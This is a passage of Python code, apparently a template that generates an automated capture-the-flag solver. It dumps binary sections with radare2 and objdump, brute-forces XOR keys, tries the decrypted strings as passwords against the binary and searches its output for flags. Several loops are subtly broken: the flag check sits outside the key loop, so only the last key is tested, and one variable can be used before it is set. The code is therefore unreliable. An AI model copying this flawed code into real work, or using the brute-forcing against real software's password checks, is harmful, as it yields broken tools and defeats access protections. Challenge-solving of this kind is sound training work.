                                sequences_to_combine_fixed = [sequences_to_combine[0][4:]] + sequences_to_combine[1:]
                            else:
                                sequences_to_combine_fixed = sequences_to_combine

                            for blob_variant in [sequences_to_combine, sequences_to_combine_fixed]:
                                combined_blob = b''.join(blob_variant)
                                if len(combined_blob) >= 6:
                                    decrypted = bytes([combined_blob[i] ^ key[i % 4] for i in range(len(combined_blob))])
                                    try:
                                        decrypted_str = decrypted.decode('utf-8')
                                        if all(32 <= ord(c) <= 126 for c in decrypted_str):
                                            if re.match(r'^[a-zA-Z0-9_]+$', decrypted_str) and len(decrypted_str) >= 6:
                                                # Try this as a password
                                                try:
                                                    result = subprocess.run([binary_path],
                                                                          input=decrypted_str.encode(),
                                                                          capture_output=True, text=True, timeout=5)
                                                    output = result.stdout + result.stderr
                                                    matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                                    if matches:
                                                        for match in matches:
                                                            if '...' not in match and 'xxx' not in match.lower():
                                                                print(match)
                                                                exit(0)
                                                except:
                                                    pass
                                    except:
                                        pass
except:
    pass

# Try using radare2 for advanced analysis
print("Using radare2 for advanced analysis...")
try:
    # Extract all data sections and look for blobs
    r2_commands = 'aaa;iS~data'  # Analyze all, list data sections
    r2_result = subprocess.run(
        ['r2', '-q', '-c', r2_commands, binary_path],
        capture_output=True, text=True, timeout=30
    )

    # Extract data section info
    data_sections = []
    for line in r2_result.stdout.split('\\n'):
        if 'data' in line.lower():
            parts = line.split()
            if len(parts) >= 3:
                # Try to extract address and size
                for i, part in enumerate(parts):
                    if part.startswith('0x'):
                        try:
                            addr = int(part, 16)
                            if i + 1 < len(parts):
                                size_str = parts[i + 1]
                                if size_str.startswith('0x'):
                                    size = int(size_str, 16)
                                else:
                                    size = int(size_str)
                                data_sections.append((addr, size))
                                break
                        except:
                            continue

    # Dump each data section and try XOR
    for addr, size in data_sections:
        if size > 0 and size < 10000:  # Reasonable size
            try:
                dump_cmd = f'px {{size}} @ {{addr}}'
                r2_dump = subprocess.run(
                    ['r2', '-q', '-c', dump_cmd, binary_path],
                    capture_output=True, text=True, timeout=10
                )

                # Extract hex bytes from dump
                hex_bytes = []
                for line in r2_dump.stdout.split('\\n'):
                    # Format: "0x00401000  5ac3 119f 29f0 72ed"
                    if re.match(r'^0x[0-9a-f]+', line):
                        parts = line.split()[1:]  # Skip address
                        for part in parts:
                            if re.match(r'^[0-9a-f]{{2,}}$', part):
                                try:
                                    # Convert pairs: "5ac3" -> [0x5a, 0xc3]
                                    for i in range(0, len(part), 2):
                                        hex_bytes.append(int(part[i:i+2], 16))
                                except:
                                    pass

                if len(hex_bytes) > 10:
                    data = bytes(hex_bytes)

                    # Try single-byte XOR
                    for key in range(1, 256):
                        decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                        if decrypted.count('flag{{') > 0:
                            matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(f"Found with XOR key {{key:#x}}")
                                        print(match)
                                        exit(0)

                    # Try as password (maybe it's decrypted already)
                    try:
                        pwd = data.decode('utf-8', errors='ignore').strip('\\x00')
                        if len(pwd) >= 4 and all(32 <= ord(c) <= 126 for c in pwd):
                            result = subprocess.run([binary_path],
                                                  input=pwd.encode(),
                                                  capture_output=True, text=True, timeout=5)
                            output = result.stdout + result.stderr
                            matches = re.findall(flag_pattern, output, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(f"Found with password from data: {{pwd}}")
                                        print(match)
                                        exit(0)
                    except:
                        pass

            except Exception as e:
                pass

except Exception as e:
    pass

# Try objdump to extract all sections including .rodata
try:
    objdump_result = subprocess.run(
        ['objdump', '-s', binary_path],
        capture_output=True, text=True, timeout=10
    )

    # Extract all hex data chunks from objdump output
    hex_chunks = []
    for line in objdump_result.stdout.split('\\n'):
        # Lines with hex data look like: " 401000 hexdata  ascii"
        if re.match(r'^\\s+[0-9a-f]+\\s+[0-9a-f]+', line):
            parts = line.split()
            if len(parts) >= 2:
                # Collect all hex columns (typically 4 columns of 8 hex digits)
                hex_data = ''.join(parts[1:5])
                if len(hex_data) >= 8:
                    hex_chunks.append(hex_data)

    # Now try XOR on collected hex chunks
    for hex_data in hex_chunks:
        try:
            data = bytes.fromhex(hex_data)
            # Try XOR with all single-byte keys
            for key in range(1, 256):
                decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
        except:
            pass

    # Use radare2 to extract .rodata section and analyze binary
    try:
            # Try radare2 first (already installed in Docker)
            r2_result = subprocess.run(
                ['r2', '-qc', 'iS~rodata', binary_path],
                capture_output=True, text=True, timeout=10
            )

            # If .rodata section exists, dump it
            if '.rodata' in r2_result.stdout:
                # Get hex dump of .rodata section
                r2_dump = subprocess.run(
                    ['r2', '-qc', 'S~rodata[0];s `S~rodata[0]`;px 4096', binary_path],
                    capture_output=True, text=True, timeout=10
                )

                # Parse radare2 hex dump format
                hex_data_chunks = []
                for line in r2_dump.stdout.split('\\n'):
                    # Format: "0x00402010  5ac3 119f 29f0 72ed 69b7 0000 0000 0000"
                    if re.match(r'^0x[0-9a-f]+\\s+', line):
                        parts = line.split()
                        if len(parts) >= 2:
                            hex_data = ''.join(parts[1:9]).replace(' ', '')  # Get hex columns
                        hex_data_chunks.append(hex_data)

            # Enhanced analysis: Look for specific blob patterns in .rodata
            # Extract all hex bytes and look for the exact blob patterns
            all_rodata_hex = ''.join(hex_data_chunks)
            if all_rodata_hex:
                try:
                    all_rodata_bytes = bytes.fromhex(all_rodata_hex)
                    
                    # Look for specific patterns that could be encrypted blobs
                    # Try to find sequences that when XORed produce readable text
                    for start_pos in range(len(all_rodata_bytes) - 10):
                        for blob_len in [6, 8, 10, 16, 23, 31]:  # Common blob sizes
                            if start_pos + blob_len <= len(all_rodata_bytes):
                                blob = all_rodata_bytes[start_pos:start_pos + blob_len]
                                
                                # Try 4-byte repeating keys (common pattern)
                                for key1 in range(0x10, 0x100, 0x10):
                                    for key2 in range(0x10, 0x100, 0x20):
                                        for key3 in range(0x10, 0x100, 0x30):
                                            for key4 in range(0x10, 0x100, 0x40):
                                                key = [key1, key2, key3, key4]
                                                decrypted = bytes([blob[i] ^ key[i % 4] for i in range(len(blob))])
                                                
                                                try:
                                                    decrypted_str = decrypted.decode('utf-8')
                                                    if all(c.isprintable() for c in decrypted_str):
                                                        # Check if this looks like a password or flag part
                                                        if (re.match(r'^[a-zA-Z0-9_]+$', decrypted_str) or
                                                            'flag' in decrypted_str.lower() or
                                                            decrypted_str.startswith("flag{{")):

                                                            print(f"Found potential decrypted data: {{decrypted_str}}")
                                                            
                                                            # If it looks like a password, try it
                                                            if (len(decrypted_str) > 4 and 
                                                                not decrypted_str.startswith('flag{{') and
                                                                re.match(r'^[a-zA-Z0-9_]+$', decrypted_str)):
                                                                try:
                                                                    result = subprocess.run([binary_path], 
                                                                                          input=decrypted_str.encode(),
                                                                                          capture_output=True, text=True, timeout=5)
                                                                    output = result.stdout + result.stderr
                                                                    matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                                                    if matches:
                                                                        for match in matches:
                                                                            if '...' not in match and 'xxx' not in match.lower():
                                                                                print(f"SUCCESS: Found flag with password '{{decrypted_str}}': {{match}}")
                                                                                print(match)
                                                                                exit(0)
                                                                except:
                                                                    pass
                                                            
                                                            # If it's a flag, print it
                                                            if decrypted_str.startswith('flag{{'):
                                                                matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                                                                if matches:
                                                                    print(f"SUCCESS: Found flag directly: {{matches[0]}}")
                                                                    print(matches[0])
                                                                    exit(0)
                                                except:
                                                    pass
                
                    # Also try common 4-byte keys found in reverse engineering
                    common_4byte_keys = [
                        [0x5a, 0xc3, 0x11, 0x9f],  # Pattern from analysis
                        [0xde, 0xad, 0xbe, 0xef],  # Classic
                        [0xca, 0xfe, 0xba, 0xbe],  # Classic
                        [0x13, 0x37, 0x42, 0x69],  # Leet speak
                    ]
                    
                    for start_pos in range(len(all_rodata_bytes) - 6):
                        for blob_len in [6, 8, 10, 16, 23, 31]:
                            if start_pos + blob_len <= len(all_rodata_bytes):
                                blob = all_rodata_bytes[start_pos:start_pos + blob_len]
                                
                                for key in common_4byte_keys:
                                    decrypted = bytes([blob[i] ^ key[i % 4] for i in range(len(blob))])
                                    
                                    try:
                                        decrypted_str = decrypted.decode('utf-8')
                                        if all(c.isprintable() for c in decrypted_str):
                                            print(f"Trying key {{[hex(k) for k in key]}} on blob: {{decrypted_str}}")
                                            
                                            # Check if this looks like a password
                                            if (len(decrypted_str) > 4 and 
                                                re.match(r'^[a-zA-Z0-9_]+$', decrypted_str) and
                                                not decrypted_str.startswith('flag{{')):
                                                try:
                                                    result = subprocess.run([binary_path], 
                                                                          input=decrypted_str.encode(),
                                                                          capture_output=True, text=True, timeout=5)
                                                    output = result.stdout + result.stderr
                                                    matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                                    if matches:
                                                        for match in matches:
                                                            if '...' not in match and 'xxx' not in match.lower():
                                                                print(f"SUCCESS with password '{{decrypted_str}}': {{match}}")
                                                                print(match)
                                                                exit(0)
                                                except:
                                                    pass
                                            
                                            # Check if it's a flag
                                            matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                                            if matches:
                                                print(f"SUCCESS: Found flag: {{matches[0]}}")
                                                print(matches[0])
                                                exit(0)
                                    except:
                                        pass
                except:
                    pass

            # Advanced XOR approach for reverse engineering challenges
            all_hex = ''.join(hex_data_chunks)

            # Generate dynamic multi-byte XOR keys
            common_multi_byte_keys = []

            # Pattern-based key generation
            for pattern_length in [2, 3, 4]:
                # Incremental patterns
                for start in range(0x10, 0x90, 0x20):
                    pattern = [(start + i) % 256 for i in range(pattern_length)]
                    common_multi_byte_keys.append(pattern)

                # Alternating patterns
                for base in [0x55, 0xaa, 0x33]:
                    pattern = [base if i % 2 == 0 else base ^ 0xff for i in range(pattern_length)]
                    common_multi_byte_keys.append(pattern)

                # Repeated byte patterns
                for val in [0x42, 0x13, 0x7f]:
                    common_multi_byte_keys.append([val] * pattern_length)

            # Add edge cases
            common_multi_byte_keys.extend([
                [0xff, 0xff, 0xff, 0xff],  # All FF
                [0x00, 0x00, 0x00, 0x00],  # All 00
                [0x01, 0x02, 0x03, 0x04],  # Sequential
            ])

            # First, try individual chunks with common multi-byte keys
            for hex_data in hex_data_chunks:
                try:
                    data = bytes.fromhex(hex_data)

                    # Try common multi-byte keys
                    for key in common_multi_byte_keys:
                        decrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
                        decrypted_str = decrypted.decode('utf-8', errors='ignore')

                        # Check for flag patterns (including partial flags)
                        if 'flag{{' in decrypted_str:
                            print(f"Found partial flag: {{decrypted_str}}")
                            # Try to extract complete flag from partial
                            flag_match = re.search(r'flag\\{{[^}}]*\\}}', decrypted_str)
                            if flag_match:
                                print(flag_match.group())
                                exit(0)

                        # Check for complete flag
                        matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match and 'xxx' not in match.lower():
                                    print(match)
                                    exit(0)

                    # Also check if it could be a password
                    if (len(decrypted_str) > 6 and
                        ('pass' in decrypted_str.lower() or 'secret' in decrypted_str.lower() or
                         'admin' in decrypted_str.lower() or re.match(r'^[a-zA-Z0-9_]+$', decrypted_str))):
                        # Try to use this as a password
                        try:
                            result = subprocess.run([binary_path],
                                                  input=decrypted_str.encode(),
                                                  capture_output=True, text=True, timeout=5)
                            output = result.stdout + result.stderr
                            matches = re.findall(flag_pattern, output, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(match)
                                        exit(0)
                        except:
                            pass
                except:
                    pass

            # Try combining multiple chunks for complete flags
            if len(hex_data_chunks) >= 2:
                # Try sequential combinations (adjacent chunks)
                for i in range(len(hex_data_chunks) - 1):
                    for chunk_count in [2, 3, 4]:  # Combine 2, 3, or 4 sequential chunks
                        if i + chunk_count <= len(hex_data_chunks):
                            try:
                                combined_hex = ''.join(hex_data_chunks[i:i+chunk_count])
                                data = bytes.fromhex(combined_hex)

                                # Try common multi-byte XOR keys
                                for key in common_multi_byte_keys:
                                    decrypted = bytes([data[k] ^ key[k % len(key)] for k in range(len(data))])
                                    decrypted_str = decrypted.decode('utf-8', errors='ignore')

                                # Check for complete flag
                                matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match and 'xxx' not in match.lower():
                                            print(match)
                                            exit(0)

                                # Also check for partial flags that might be completable
                                if 'flag{{' in decrypted_str:
                                    print(f"Found partial flag in chunk combination: {{decrypted_str}}")
                            except:
                                pass

            # Try larger chunks for complete flags
            for start_pos in range(0, len(all_hex) - 64, 16):  # Every 16 chars (8 bytes)
                for chunk_size in [64, 80, 96, 112, 128]:  # Larger chunk sizes
                    if start_pos + chunk_size <= len(all_hex):
                        chunk_hex = all_hex[start_pos:start_pos + chunk_size]
                        try:
                            chunk_data = bytes.fromhex(chunk_hex)

                            # Try common multi-byte XOR keys
                            for key in common_multi_byte_keys:
                                decrypted = bytes([chunk_data[i] ^ key[i % len(key)] for i in range(len(chunk_data))])
                                decrypted_str = decrypted.decode('utf-8', errors='ignore')

                            # Check for complete flag
                            matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(match)
                                        exit(0)
                        except:
                            pass

            # Try common XOR keys on hex chunks
            for hex_data in hex_data_chunks:
                try:
                    data = bytes.fromhex(hex_data)
                    # Try XOR with dynamically generated single-byte keys
                    key_candidates = list(range(0x10, 0x100, 0x10)) + [0xff, 0x00, 0x01]
                    for key in key_candidates:
                        decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                        matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match and 'xxx' not in match.lower():
                                    print(match)
                                    exit(0)
                except:
                    pass

            # Fallback: try single-byte XOR on chunks
            for hex_data in hex_data_chunks:
                try:
                    data = bytes.fromhex(hex_data)
                    for key in range(1, 256):
                        decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                        matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match and 'xxx' not in match.lower():
                                    print(match)
                                    exit(0)
                except:
                    pass
    except:
        pass
except:
    pass

# Fallback: Extract strings using radare2 or strings command
try:
    # Try radare2 first (more comprehensive)
    strings_result = subprocess.run(['r2', '-qc', 'iz;izz', binary_path], capture_output=True, text=True, timeout=10)
    if not strings_result.stdout.strip():
        # Fallback to regular strings command
        strings_result = subprocess.run(['strings', binary_path], capture_output=True, text=True, timeout=10)
    strings_output = strings_result.stdout

    # Try XOR with all keys
    for key in range(1, 256):
        for line in strings_output.split('\\n'):
            try:
                decrypted = ''.join(chr(ord(c) ^ key) if ord(c) < 128 else '?' for c in line)
                matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
            except:
                pass
except:
    pass

print("No flag found")
'''
        return script
